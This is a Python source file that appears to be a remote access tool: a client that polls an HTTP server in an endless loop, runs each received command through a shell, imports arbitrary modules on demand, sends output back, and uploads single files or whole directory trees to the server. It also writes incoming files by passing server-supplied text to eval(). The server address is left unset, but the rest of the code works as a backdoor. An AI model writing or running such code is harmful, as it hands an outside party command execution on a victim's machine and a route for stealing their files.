#!/usr/bin/python3
import requests
import subprocess
from os import path,listdir,getcwd
from os.path import isdir,isfile


class Client():
    def __init__(self,server):
        self.server = server
    
    def sender(self,data=None,fileName=None):
        if fileName:
            fn=fileName.split("/")[-1]
            uploadURL=self.server+"/upload"    
            file={'file': open(fileName,"rb"),'name':fn }
            requests.post(uploadURL,files=file) 
        if data:
            requests.post(self.server,data)

    def setModule(self,command=None):
        newModule="os"
        if command:
            newModule=(command.split("import ")[1])
        self.module = __import__(newModule)
    
    def pack(self,command):
        tmp=command.split("-")[1]
        attribute=tmp.split()[0]
        arguments=tmp.split()[1:]
        function = getattr(self.module, attribute)       
        if len(arguments)==0:
            d = function()
        elif len(arguments) == 1:
            d = function(arguments[0])     
        elif len(arguments) == 2:
            d = function(arguments[0],arguments[1])
        else:
            d = "At the moment no support for more than two arguments"
        self.sender(d)

    def process(self,c):
        if c.startswith("cd"):
            dir=c.split("cd ")[1]
            self.setModule()
            self.pack(f"-chdir {dir}")
        else:
            P = subprocess.Popen(c, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out = P.stdout.read()
            err = P.stderr.read()
            if not out:
                self.sender(err)
            else:
                self.sender(out)
    
    def fileReciver(self,command):  
        dataDict=eval(command.split("upload ")[1])
        fileToSave=dataDict['name']
        data=dataDict['data']
        with open(fileToSave, 'wb') as o:
            o.write( data )

    def folder(self,folderPath):
        files=listdir(folderPath)
        fullPath=[folderPath+"/"+file for file in files ]
        for file in fullPath:
            if isdir(file):
                self.folder(f'{file}')
            if isfile(file):
                self.sender(fileName=file)
            else:
                self.sender("File Path Error")
    
    def file(self,command):
        file=command.split("download ")[1]
        filePath=(getcwd()+"/"+file)
        if isdir(filePath):
            self.folder(filePath)
        elif file.startswith("all"):
            files=listdir()
            fullPath=[f"{getcwd()}/{file}" for file in files ]
            for file in fullPath:
                if isdir(file):
                    self.folder(file)
                else:
                    self.sender(fileName=file)
        else:
            if path.exists(file):
                self.sender(fileName=file)
            else:
                self.sender("File Missing")

    def command(self,command):
        try:
            if command.startswith("download "):
                self.file(command)
            elif command.startswith("upload "):
                self.fileReciver(command)
            elif command.startswith("-"):
                self.pack(command)
            elif  command.startswith("import"):
                self.setModule(command)
            else:
                self.process(command)
        except Exception as e:
            self.sender(str(e))

def main():
    #server = "http://0.0.0.0"
    server=None
    obj=Client(server)
    while True:
        try:
            RevcivedData = requests.get(server)
            command = RevcivedData.text
            obj.command(command)
        except Exception as e:
            pass

if __name__ == "__main__":
    main()